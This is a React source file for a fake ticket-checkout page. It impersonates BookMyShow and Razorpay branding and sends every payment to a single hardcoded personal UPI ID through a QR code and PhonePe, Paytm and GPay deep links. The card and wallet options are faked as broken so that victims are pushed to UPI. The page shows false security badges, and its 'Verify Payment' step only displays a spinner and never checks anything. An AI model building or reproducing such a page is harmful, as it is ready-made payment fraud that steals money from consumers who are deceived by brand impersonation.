import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, ArrowLeft, QrCode, CreditCard, Wallet, 
  Building2, ChevronDown, CheckCircle2, Info, PlusCircle, 
  Loader2, XCircle, Lock
} from 'lucide-react';

const UPI_ID = "paytm.s1h6t6g@pty";

export default function App() {
  // --- States ---
  const [totalAmount, setTotalAmount] = useState(1000);
  const [timeLeft, setTimeLeft] = useState(900); // 15 mins
  const [activeAccordion, setActiveAccordion] = useState('upi');
  const [payments, setPayments] = useState([]); // List of {utr, amount}
  const [utrInput, setUtrInput] = useState('');
  const [amtInput, setAmtInput] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [copied, setCopied] = useState(false);

  // --- Calculations ---
  const totalPaid = payments.reduce((sum, p) => sum + p.amount, 0);
  const remainingAmount = totalAmount - totalPaid;
  const progressPercent = Math.min((totalPaid / totalAmount) * 100, 100);

  // --- Effects ---
  useEffect(() => {
    const saved = localStorage.getItem("selectedTotalPrice");
    if (saved) setTotalAmount(Number(saved));

    const timer = setInterval(() => {
      setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // --- Handlers ---
  const copyUpi = () => {
    navigator.clipboard.writeText(UPI_ID);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const addPayment = () => {
    const amt = parseInt(amtInput);
    if (utrInput.length !== 12) return alert("Enter 12-digit UTR");
    if (isNaN(amt) || amt <= 0) return alert("Enter valid amount");
    if (totalPaid + amt > totalAmount) return alert("Amount exceeds total payable");

    setPayments([...payments, { utr: utrInput, amount: amt }]);
    setUtrInput('');
    setAmtInput('');
  };

  const removePayment = (index) => {
    setPayments(payments.filter((_, i) => i !== index));
  };

  // --- Deep Links ---
  const upiUrl = `upi://pay?pa=${UPI_ID}&pn=Ticket%20Payment&am=${remainingAmount}&cu=INR`;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiUrl)}`;

  const phonePeLink = () => {
    const payload = {
      contact: { vpa: UPI_ID },
      p2pPaymentCheckoutParams: { note: "Ticket Payment", initialAmount: remainingAmount * 100, currency: "INR" }
    };
    const b64 = btoa(JSON.stringify(payload));
    return `phonepe://native?data=${encodeURIComponent(b64)}&id=p2ppayment`;
  };

  return (
    <div className="min-h-screen bg-gray-50 pb-24 md:pb-8">
      {/* Header */}
      <header className="glassmorphism sticky top-0 z-50 py-3 px-4 flex justify-between items-center shadow-sm">
        <div className="flex items-center space-x-3">
          <ArrowLeft className="w-5 h-5 text-gray-600 cursor-pointer" />
          <img src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png" alt="BMS" className="h-6" />
          <div className="h-5 w-px bg-gray-200 hidden sm:block"></div>
          <span className="text-xs font-semibold text-gray-500 hidden sm:block">SECURE CHECKOUT</span>
        </div>
        <div className="flex items-center space-x-1.5 bg-green-50 px-3 py-1 rounded-full border border-green-100">
          <ShieldCheck className="w-4 h-4 text-green-600" />
          <span className="text-[10px] font-bold text-green-700">100% SECURE</span>
        </div>
      </header>

      <div className="container mx-auto p-4 max-w-6xl">
        <div className="flex flex-col md:flex-row gap-6">
          
          {/* Main Payment Section */}
          <div className="flex-1 space-y-4">
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
              <div className="p-5 border-b border-gray-50">
                <h2 className="text-lg font-bold text-gray-800">Choose Payment Method</h2>
                <p className="text-xs text-gray-400">Transactions are encrypted and secure</p>
              </div>

              {/* 1. UPI / QR Accordion */}
              <div className="border-b border-gray-50">
                <button 
                  onClick={() => setActiveAccordion(activeAccordion === 'upi' ? '' : 'upi')}
                  className="w-full p-4 flex items-center justify-between hover:bg-gray-50 transition-colors"
                >
                  <div className="flex items-center">
                    <div className="p-2 bg-green-100 rounded-lg mr-3 text-green-600"><QrCode size={20} /></div>
                    <span className="font-semibold text-gray-700">UPI / QR</span>
                    <img src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png" className="h-5 ml-4 hidden md:block opacity-70" alt="upi" />
                  </div>
                  <ChevronDown className={`w-5 h-5 text-gray-400 transition-transform ${activeAccordion === 'upi' ? 'rotate-180' : ''}`} />
                </button>

                <div className={`accordion-content ${activeAccordion === 'upi' ? 'open' : ''}`}>
                  <div className="p-4 bg-gray-50/50 space-y-6">
                    <div className="text-center">
                      <p className="text-xs font-bold text-gray-500 mb-2 uppercase tracking-wider">
                        Scan within <span className="text-red-600">{Math.floor(timeLeft/60)}:{String(timeLeft%60).padStart(2,'0')}</span>
                      </p>
                      <div className="inline-block p-3 bg-white rounded-2xl border border-gray-200 shadow-sm mb-4">
                        <img src={qrUrl} alt="QR" className="w-44 h-44" />
                      </div>
                      <p className="text-xs text-gray-500 mb-6">Scan QR using any UPI App</p>

                      {/* Deep Link Buttons */}
                      <div className="flex justify-center gap-6 mb-6">
                        <a href={phonePeLink()} className="flex flex-col items-center gap-1 group">
                          <img src="https://cdn.razorpay.com/app/phonepe.svg" className="w-10 h-10 group-active:scale-90 transition-transform" />
                          <span className="text-[10px] font-bold text-gray-600 uppercase">PhonePe</span>
                        </a>
                        <a href={`paytmmp://cash_wallet?pa=${UPI_ID}&pn=Payment&am=${remainingAmount}&cu=INR`} className="flex flex-col items-center gap-1 group">
                          <img src="https://cdn.razorpay.com/app/paytm.svg" className="w-10 h-10 group-active:scale-90 transition-transform" />
                          <span className="text-[10px] font-bold text-gray-600 uppercase">Paytm</span>
                        </a>
                        <a href={`tez://upi/pay?pa=${UPI_ID}&pn=Payment&am=${remainingAmount}&cu=INR`} className="flex flex-col items-center gap-1 group">
                          <img src="https://cdn.razorpay.com/app/google_pay.svg" className="w-10 h-10 group-active:scale-90 transition-transform" />
                          <span className="text-[10px] font-bold text-gray-600 uppercase">GPay</span>
                        </a>
                      </div>

                      {/* Manual Copy Box */}
                      <div className="bg-white p-4 rounded-xl border border-gray-200 text-left">
                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">UPI ID</p>
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-sm font-bold text-gray-800 truncate">{UPI_ID}</span>
                          <button 
                            onClick={copyUpi}
                            className={`text-[10px] font-bold px-3 py-1.5 rounded-lg transition-all ${copied ? 'bg-green-600 text-white' : 'bg-indigo-600 text-white'}`}
                          >
                            {copied ? 'COPIED' : 'COPY'}
                          </button>
                        </div>
                      </div>
                    </div>

                    {/* Partial Payment Logic */}
                    <div className="bg-white p-4 rounded-xl border border-gray-200 shadow-sm">
                      <div className="flex items-start gap-3 p-3 bg-yellow-50 border-l-4 border-yellow-400 rounded-lg mb-4">
                        <Info className="w-5 h-5 text-yellow-600 shrink-0" />
                        <p className="text-[10px] text-yellow-800 font-medium">
                          If total is over ₹2,000, you can make multiple payments. Enter each UTR below.
                        </p>
                      </div>

                      <div className="space-y-4">
                        <div className="flex justify-between text-xs font-bold uppercase tracking-widest text-gray-500">
                          <span>Total Paid: ₹{totalPaid}</span>
                          <span className="text-red-500">Left: ₹{remainingAmount}</span>
                        </div>
                        <div className="h-2 w-full bg-gray-100 rounded-full overflow-hidden">
                          <div 
                            className="h-full bg-gradient-to-r from-indigo-500 to-purple-500 transition-all duration-500"
                            style={{ width: `${progressPercent}%` }}
                          ></div>
                        </div>

                        {/* Payment History */}
                        <div className="space-y-2">
                          {payments.map((p, i) => (
                            <div key={i} className="flex justify-between items-center p-3 bg-gray-50 rounded-lg border border-gray-100">
                              <div>
                                <p className="text-[10px] font-bold text-gray-400 uppercase">UTR: {p.utr}</p>
                                <p className="text-sm font-bold text-gray-800">₹{p.amount}</p>
                              </div>
                              <button onClick={() => removePayment(i)} className="text-red-400"><XCircle size={18} /></button>
                            </div>
                          ))}
                        </div>

                        {/* Add Payment Inputs */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-4 border-t border-gray-100">
                          <div>
                            <label className="text-[10px] font-bold text-gray-400 uppercase mb-1 block tracking-wider">12-Digit UTR</label>
                            <input 
                              type="text" 
                              maxLength={12}
                              value={utrInput}
                              onChange={(e) => setUtrInput(e.target.value.replace(/\D/g, ''))}
                              placeholder="000000000000"
                              className="w-full p-2.5 border rounded-lg text-sm focus:ring-2 focus:ring-indigo-200 outline-none transition-all"
                            />
                          </div>
                          <div>
                            <label className="text-[10px] font-bold text-gray-400 uppercase mb-1 block tracking-wider">Amount</label>
                            <input 
                              type="number" 
                              value={amtInput}
                              onChange={(e) => setAmtInput(e.target.value)}
                              placeholder="Max ₹2000"
                              className="w-full p-2.5 border rounded-lg text-sm focus:ring-2 focus:ring-indigo-200 outline-none transition-all"
                            />
                          </div>
                          <button 
                            onClick={addPayment}
                            className="sm:col-span-2 bg-indigo-600 text-white py-3 rounded-xl font-bold flex items-center justify-center gap-2 hover:bg-indigo-700 active:scale-95 transition-all shadow-lg shadow-indigo-100"
                          >
                            <PlusCircle size={18} /> Add Payment
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* 2. Cards (Disabled) */}
              <div className="border-b border-gray-50">
                <div className="p-4 flex items-center justify-between opacity-50 cursor-not-allowed">
                  <div className="flex items-center">
                    <div className="p-2 bg-purple-100 rounded-lg mr-3 text-purple-600"><CreditCard size={20} /></div>
                    <span className="font-semibold text-gray-400">Cards</span>
                  </div>
                  <span className="text-[10px] font-bold text-red-500 bg-red-50 px-2 py-0.5 rounded uppercase">Server Error</span>
                </div>
              </div>

              {/* 3. Wallet Accordion */}
              <div className="border-b border-gray-50">
                <button 
                  onClick={() => setActiveAccordion(activeAccordion === 'wallet' ? '' : 'wallet')}
                  className="w-full p-4 flex items-center justify-between hover:bg-gray-50 transition-colors"
                >
                  <div className="flex items-center">
                    <div className="p-2 bg-yellow-100 rounded-lg mr-3 text-yellow-600"><Wallet size={20} /></div>
                    <span className="font-semibold text-gray-700">Wallets</span>
                  </div>
                  <ChevronDown className={`w-5 h-5 text-gray-400 transition-transform ${activeAccordion === 'wallet' ? 'rotate-180' : ''}`} />
                </button>
                <div className={`accordion-content ${activeAccordion === 'wallet' ? 'open' : ''}`}>
                  <div className="p-6 text-center text-sm text-gray-500">
                    Wallet server connecting... Please use UPI for instant booking.
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Sidebar Info */}
          <div className="w-full md:w-80">
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 sticky top-24 space-y-6">
              <div>
                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Amount to Pay</p>
                <h3 className="text-3xl font-black text-gray-900">₹{totalAmount.toLocaleString()}</h3>
              </div>

              <button 
                disabled={totalPaid < totalAmount}
                onClick={() => setIsProcessing(true)}
                className={`w-full py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 transition-all ${
                  totalPaid >= totalAmount 
                  ? 'bg-indigo-600 text-white shadow-xl shadow-indigo-100 active:scale-95' 
                  : 'bg-gray-100 text-gray-400 cursor-not-allowed uppercase'
                }`}
              >
                <CheckCircle2 size={18} /> Verify Payment
              </button>

              <div className="space-y-4 pt-4 border-t border-gray-50">
                <div className="flex items-center gap-3">
                  <Lock className="w-4 h-4 text-green-500" />
                  <p className="text-[10px] font-bold text-gray-500 uppercase tracking-tight">SSL Secured Encryption</p>
                </div>
                <div className="flex justify-center opacity-40 grayscale">
                  <img src="https://d6xcmfyh68wv8.cloudfront.net/assets/razorpay-logo.svg" className="h-4" alt="razorpay" />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Mobile Footer Button */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 p-4 md:hidden z-40">
        <button 
          disabled={totalPaid < totalAmount}
          onClick={() => setIsProcessing(true)}
          className={`w-full py-4 rounded-2xl font-black text-sm transition-all ${
            totalPaid >= totalAmount 
            ? 'bg-indigo-600 text-white active:scale-95' 
            : 'bg-gray-100 text-gray-400'
          }`}
        >
          VERIFY PAYMENT
        </button>
      </div>

      {/* Processing Popup Modal */}
      {isProcessing && (
        <div className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center p-0 sm:p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => setIsProcessing(false)}></div>
          <div className="bg-white w-full max-w-md rounded-t-[2.5rem] sm:rounded-[2rem] p-8 relative z-10 animate-in slide-in-from-bottom duration-500">
            <div className="flex flex-col items-center text-center">
              <div className="flex items-center gap-2 mb-6 text-indigo-600">
                <Loader2 className="w-5 h-5 animate-spin" />
                <span className="font-bold uppercase text-xs tracking-widest">Processing</span>
              </div>
              <h3 className="text-xl font-black text-gray-800 mb-2">Verifying UTR Records</h3>
              <p className="text-sm text-gray-500 mb-8 leading-relaxed">
                This usually takes 20-30 seconds. Please do not refresh or close this page.
              </p>
              
              <div className="perspective-1000 mb-8">
                <img 
                  src="https://checkout-static-next.razorpay.com/build/assets/images/coin.6caba344.png" 
                  className="w-24 h-24 coin-flip" 
                  alt="coin" 
                />
              </div>

              <div className="p-4 bg-gray-50 rounded-2xl border border-gray-100 mb-8">
                <p className="text-[10px] font-bold text-gray-400 uppercase mb-2">Security Notice</p>
                <p className="text-[11px] text-gray-500 leading-relaxed">
                  If the amount is deducted but the ticket isn't confirmed yet, our team will verify it manually within 24 hours.
                </p>
              </div>

              <button 
                onClick={() => setIsProcessing(false)}
                className="w-full py-3 border-2 border-gray-100 rounded-xl font-bold text-gray-500 hover:bg-gray-50 transition-colors"
              >
                Close Window
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
            }
